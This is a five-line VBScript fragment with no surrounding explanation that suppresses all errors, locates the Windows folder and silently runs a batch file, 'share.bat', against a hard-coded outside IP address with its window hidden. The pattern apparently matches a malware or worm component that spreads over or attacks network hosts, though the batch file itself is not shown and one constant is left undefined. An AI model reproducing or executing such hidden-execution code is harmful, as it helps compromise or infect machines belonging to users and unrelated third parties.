on error resume next
Set fso = CreateObject("Scripting.FileSystemObject")
windows = fso.GetSpecialFolder(WindowsFolder)
Set src3 = CreateObject("Wscript.shell")
src3.run "share.bat 210.149.252.233",0,true
